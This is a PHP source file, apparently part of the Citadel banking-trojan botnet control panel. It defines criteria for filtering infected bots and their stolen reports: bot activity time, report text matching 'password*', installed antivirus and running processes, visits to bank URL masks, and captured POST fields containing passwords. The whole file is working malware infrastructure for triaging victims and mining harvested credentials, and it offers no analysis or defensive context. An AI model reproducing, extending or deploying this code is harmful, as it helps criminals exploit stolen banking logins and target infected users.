<?php namespace lib\fun\NeuroStat\Criteria;

/**
 * Neurostat criteria objects
 */

use Amiss\Manager;
use Citadel\Models;

#region Abstract Criteria

/**
 * Base Criterion
 */
abstract class ACriterion {
    /** (const) Criterion name (system)
     * @var string
     */
    const NAME = '(criterion name)';

    /** (const) Criterion description (system)
     * @var string
     */
    const DESCR = '(criterion descr)';

    /** Default settings (for new objects)
     * @var array
     */
    protected $default_sets = array();

    /** Criterion settings from the DB
     * @var Models\NeurostatCriterion
     */
    public $c;

    /** Database connection
     * @var \PDO
     */
    protected $db;

    /** Amiss manager
     * @var Manager
     */
    protected $man;

    /** Initialize the criterion processor
     * @param Models\NeurostatCriterion $config This criterion config
     * @param Manager $man Model manager
     */
    final function __construct(Models\NeurostatCriterion $config, Manager $man){
        # Sets
        $this->c = $config;
        if (empty($this->c->sets))
            $this->c->sets = $this->default_sets;
        # DB
        $this->man = $man;
        $this->db = $man->getConnector();
        # Init
        $this->initialize();
    }

    /** Initialize this object right after construction
     */
    function initialize(){
    }

    /** Using the FormBuilder, create the form fragment that handles $this->config->sets.
     * Use `criterion[sets]` as a prefix for the settings array
     */
    function settingsForm(\FormBuilder\Tag\Tag $root){
    }

    /** Post-Process $this->config->sets after form submission
     */
    function settingsFormSubmit(){
    }

    final function __toString(){
        $s = static::NAME.': '.$this->_setsToString();
        if ($this->c->negated)
            $s = "NOT: $s";
        if ($this->c->c_stat)
            $s = "{$this->c->c_stat}( $s ) {$this->c->c_operator} {$this->c->c_threshold}";
        return $s;
    }

    /** Short string representation of the criterion settings
     * It's wrapped with __toString() method
     * @return string
     */
    abstract protected function _setsToString();

    /** Check whether this criterion wants to process the provided table
     * @param string $yymmdd
     * @return bool
     */
    final function checkDaysLimit($yymmdd){
        if (empty($this->c->days_limit))
            return true;
        # Convert $this->days_limit format & compare
        $yymmdd_limit = date('ymd', time() - 60*60*24*$this->c->days_limit);
        return $yymmdd >= $yymmdd_limit;
    }
}



/**
 * Base Bot criterion: acts on the bot info
 */
abstract class ABotCriterion extends ACriterion {
    /** Match the provided bot against this criterion
     * @param object $bot Bot data (botnet_list)
     * @return bool
     */
    abstract function match($bot);
}



/**
 * Base Report criterion: acts on the report
 */
abstract class AReportCriterion extends ACriterion {
    /** Return an SQL string condition to match certain reports suitable for this criterion to process,
     * as well as the placeholder data for the query chunk.
     *
     * @param string $p Placeholder prefix
     * @param string $reports `botnet_reports_%` table alias
     * @return array array(string, array)
     */
    abstract function condition($p, $reports);

    /** Match the provided report against this criterion
     * @param string $yymmdd Report date: yymmdd
     * @param int $id Report id
     * @param object $report Report data
     * @return mixed
     */
    abstract function match($yymmdd, $id, $report);
}

#endregion



#region Bot Criteria

/**
 * Condition on the bot's first report time (bot->rtime_first)
 */
class BotFirstReport extends ABotCriterion {
    const NAME = LNG_NEUROSTAT_CRITERION_FIRSTREPORT;
    const DESCR = LNG_NEUROSTAT_CRITERION_FIRSTREPORT_DESCR;

    protected $default_sets = array(
        'op' => '>=',
        'days' => 3,
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_FIRSTREPORT_SET_DAYS)->up()
            ->dd()
                ->select('criterion[sets][op]')->options(Models\NeurostatCriterion::c_operator_options())->up()
                ->inputNumber('criterion[sets][days]')
            ;
    }

    function _setsToString() {
        return "{$this->c->sets['op']} {$this->c->sets['days']} days";
    }

    /** The day we're comparing against, timestamp
     * @var int
     */
    protected $days_tm;

    function initialize() {
        $this->days_tm = time() - 60*60*24*$this->c->sets['days'];
    }

    /**
     * @param Models\Bot $bot
     * @return bool
     */
    function match($bot) {
        return op_cmp($this->c->sets['op'], $bot->rtime_first, $this->days_tm);
    }
}



/**
 * Condition on the bot's last report time (bot->rtime_last)
 */
class BotLastReport extends BotFirstReport { # Pretty much the same, thus, we inherit
    const NAME = LNG_NEUROSTAT_CRITERION_LASTREPORT;
    const DESCR = LNG_NEUROSTAT_CRITERION_LASTREPORT_DESCR;

    /**
     * @param Models\Bot $bot
     * @return bool
     */
    function match($bot) {
        return op_cmp($this->c->sets['op'], $bot->rtime_last, $this->days_tm);
    }
}



class BotWeeklyOnline extends ABotCriterion {
    const NAME = LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE;
    const DESCR = LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE_DESCR;

    protected $default_sets = array(
        'op' => '<=',
        'hours' => 48,
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_BOTWEEKLYONLINE_SET_HOURS)->up()
            ->dd()
            ->select('criterion[sets][op]')->options(Models\NeurostatCriterion::c_operator_options())->up()
            ->inputNumber('criterion[sets][hours]')
        ;
    }

    function _setsToString() {
        return "{$this->c->sets['op']} {$this->c->sets['hours']} hours";
    }

    /** Average bot online times: array( botId => avg(hours per week) )
     * @var float[]
     */
    protected $_botnet_avg_online;

    function initialize() {
        $q = $this->db->query(
            'SELECT
                `botId`,
                AVG((`rtime_last` - `rtime_first`)/60/60)*7 AS `online`
             FROM `botnet_activity`
             GROUP BY `botId`
            ;'
        );
        $q->execute();
        $this->_botnet_avg_online = $q->fetchAll(\PDO::FETCH_KEY_PAIR);
    }


    /**
     * @param Models\Bot $bot
     * @return bool
     */
    function match($bot) {
        return op_cmp($this->c->sets['op'],
            isset($this->_botnet_avg_online[$bot->bot_id])
                ? $this->_botnet_avg_online[$bot->bot_id]
                : 0,
            $this->c->sets['hours']
        );
    }
}
#endregion



#region Report Criteria

/**
 * Matches the report type
 */
class ReportType extends AReportCriterion {
    const NAME = LNG_NEUROSTAT_CRITERION_REPORT_TYPE;
    const DESCR = LNG_NEUROSTAT_CRITERION_REPORT_TYPE_DESCR;

    protected $default_sets = array(
        'type' => '-1',
    );

    /** Report types mapped to titles, with an addition of HTTPX 'or' requests
     * @return array
     */
    protected function _report_types(){
        return array(
            -1 => LNG_BLT_HTTPX_REQUEST,
        ) + report_types();
    }

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_REPORT_TYPE_SET_TYPE)->up()
             ->dd()->select('criterion[sets][type]')->options($this->_report_types());
    }

    function _setsToString() {
        $types = $this->_report_types(); /** @var string[] $types */
        return $types[$this->c->sets['type']];
    }

    function condition($p, $reports) {
        # Special HTTPX 'or' case
        if ($this->c->sets['type'] == -1)
            return array(
                sprintf(
                    "`{$reports}`.`type` IN (%d, %d)",
                    BLT_HTTP_REQUEST,
                    BLT_HTTPS_REQUEST
                ), null
            );
        # Common case
        return array(
            "`{$reports}`.`type` = {$this->c->sets['type']}",
            null
        );
    }

    function match($yymmdd, $id, $report) {
        # Special HTTPX 'or' case
        if ($this->c->sets['type'] == -1)
            return $report->type == BLT_HTTP_REQUEST || $report->type == BLT_HTTPS_REQUEST;
        # Common case
        return $report->type == $this->c->sets['type'];
    }
}



/**
 * Matches the generic report contents
 */
class ReportContents extends ReportType {
    const NAME = LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS;
    const DESCR = LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_DESCR;

    protected $default_sets = array(
        'type' => '',
        'context' => '',
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        parent::settingsForm($root);
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_SET_CONTENTS)->up()
             ->dd()->textarea('criterion[sets][context]', 90, 7)->placeholder('password*')->hint(LNG_NEUROSTAT_CRITERION_REPORT_CONTENTS_SET_CONTENTS_HINT);
    }

    function _setsToString() {
        return parent::_setsToString().': '.$this->c->sets['context'];
    }

    /** Regexp on the context
     * @var string
     */
    protected $context_rex;

    function initialize() {
        $rex = array();
        foreach (array_filter(array_map('trim', explode("\n", $this->c->sets['context']))) as $w)
            $rex[] = wildcart_body($w, '#');
        $this->context_rex = '#'.implode('|', $rex).'#iS';
    }

    function match($yymmdd, $id, $report) {
        # Parent match
        if (!parent::match($yymmdd, $id, $report))
            return FALSE;

        # Now match the contents
        return (bool)preg_match($this->context_rex, $report->context);
    }
}



/**
 * Matches the installed software lists
 */
class InstalledSoftware extends AReportCriterion {
    const NAME = LNG_NEUROSTAT_CRITERION_INSTSOFT;
    const DESCR = LNG_NEUROSTAT_CRITERION_INSTSOFT_DESCR;

    protected $default_sets = array(
        'soft' => '',
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_INSTSOFT_SET_SOFTWARE)->up()
             ->dd()->textarea('criterion[sets][soft]', 90, 7)->placeholder('Avast*')->hint(LNG_NEUROSTAT_CRITERION_INSTSOFT_SET_SOFTWARE_HINT);
    }

    function _setsToString() {
        return $this->c->sets['soft'];
    }

    function condition($p, $reports) {
        return array(
            "`{$reports}`.`type` = ".BLT_ANALYTICS_SOFTWARE,
            null
        );
    }

    /** Regexp on the installed software line
     * @var string
     */
    protected $software_rex = '';

    function initialize() {
        $rex = array();
        foreach (array_filter(array_map('trim', explode("\n", $this->c->sets['soft']))) as $w)
            $rex[] = wildcart_body($w, '#');
        $this->software_rex = '#^('.implode('|', $rex).')#iS';
    }

    function match($yymmdd, $id, $report) {
        $preport = new \Report_AnalyticsSoftware_Parser($report->context);
        foreach ($preport->soft as $soft)
            foreach ($soft as $n) # Each possible representation
                if (preg_match($this->software_rex, $n))
                    return TRUE;
        return FALSE;
    }
}



/**
 * Matches the launched software lists, as provided by the `tasklist` CMD command
 */
class TaskList extends InstalledSoftware {
    const NAME = LNG_NEUROSTAT_CRITERION_TASKLIST;
    const DESCR = LNG_NEUROSTAT_CRITERION_TASKLIST_DESCR;

    protected $default_sets = array(
        'soft' => '',
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_TASKLIST_SET_SOFTWARE)->up()
            ->dd()->textarea('criterion[sets][soft]', 90, 7)->placeholder('Avast*')->hint(LNG_NEUROSTAT_CRITERION_TASKLIST_SET_SOFTWARE_HINT);
    }

    function _setsToString() {
        return $this->c->sets['soft'];
    }

    function condition($p, $reports) {
        return array(
            "`{$reports}`.`type` = ".BLT_COMMANDLINE_RESULT,
            null
        );
    }

    function match($yymmdd, $id, $report) {
        # Get the list of running applications
        $apps = NULL;
        $preport = new \Report_CommandLine_Parser($report->context);
        $preport->parse();
        foreach ($preport->commands as $cmd)
            if ($cmd instanceof \TaskListCmdResult)
                $apps = $cmd->apps;
        if (is_null($apps))
            return FALSE;

        # Now match it
        foreach ($apps as $app)
            if (preg_match($this->software_rex, $app))
                return TRUE;
        return FALSE;
    }
}



/**
 * Matches a bot's visit to the specified URL mask
 */
class ReportHttp_VisitUrl extends AReportCriterion {
    const NAME = LNG_NEUROSTAT_CRITERION_HTTP_VISITURL;
    const DESCR = LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_DESCR;

    protected $default_sets = array(
        'urls' => '',
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_SET_URLMASK)->up()
            ->dd()->textarea('criterion[sets][urls]', 90, 7)->placeholder('htt?://*.bank.com/*')->hint(LNG_NEUROSTAT_CRITERION_HTTP_VISITURL_SET_URLMASK_HINT);
    }

    function _setsToString() {
        return $this->c->sets['urls'];
    }


    /** Regexp on URL
     * @var string[]
     */
    protected $urls_rex = '';

    /** Regexp on URL for MySQL
     * @var string
     */
    protected $urls_rex_sql = '';

    function initialize() {
        $rex = array();
        foreach (array_filter(array_map('trim', explode("\n", $this->c->sets['urls']))) as $w)
            $rex[] = wildcart_body($w, '#');
        $this->urls_rex_sql = '^('.implode('|', $rex).')';
        $this->urls_rex = '#'.$this->urls_rex_sql.'#iS';
    }

    function condition($p, $reports) {
        $data[$ph = ":{$p}urls_rex_sql"] = $this->urls_rex_sql;
        $cond = "`{$reports}`.`type` IN(".BLT_HTTP_REQUEST.", ".BLT_HTTPS_REQUEST.") AND `{$reports}`.`path_source` REGEXP BINARY  {$ph}";
        return array(
            $cond,
            $data
        );
    }

    function match($yymmdd, $id, $report) {
        return (bool)preg_match($this->urls_rex, $report->path_source);
    }
}



/**
 * Matches the bot's POST to one the specified URL mask, with any of the provided POST field masks
 */
class ReportHttp_POST extends ReportHttp_VisitUrl {
    const NAME = LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA;
    const DESCR = LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_DESCR;

    protected $default_sets = array(
        'urls' => '',
        'post' => '',
    );

    function settingsForm(\FormBuilder\Tag\Tag $root) {
        parent::settingsForm($root);
        $root->dt()->addText(LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_SET_POSTMASK)->up()
            ->dd()->textarea('criterion[sets][post]', 90, 7)->placeholder('password*=')->hint(LNG_NEUROSTAT_CRITERION_HTTP_POSTDATA_SET_POSTMASK_HINT);
    }

    /** Processed regular expression that matches any of the POST field names
     * @var string
     */
    protected $post_rex = '';

    function initialize() {
        parent::initialize();
        $rex = array();
        foreach (array_filter(array_map('trim', explode("\n", $this->c->sets['post']))) as $w)
            $rex[] = wildcart_body($w, '#');
        $this->post_rex = '#^('.implode('|', $rex).')=#iumS';
    }

    function match($yymmdd, $id, $report) {
        # First, test the URL
        if (!parent::match($yymmdd, $id, $report))
            return FALSE;

        # Now test if any of the post fields matches
        return (bool)preg_match($this->post_rex, $report->context);
    }
}

#endregion



#region Helpers

/** Custom string operator comparison
 * @param string $op Operator
 * @param mixed $left Operand
 * @param mixed $right Operand
 */
function op_cmp($op, $left, $right){
    switch ($op){
        case '<=':  return $left <= $right; break;
        case '<':   return $left <  $right; break;
        case '=':
        case '==':
                    return $left == $right; break;
        case '>':   return $left > $right; break;
        case '>=':  return $left >= $right; break;
        case '!=':
        case '<>':  return $left != $right; break;
        default:
            trigger_error('Unknown operator provided: "'.$op.'"', E_USER_ERROR);
            return false;
    }
}

#endregion
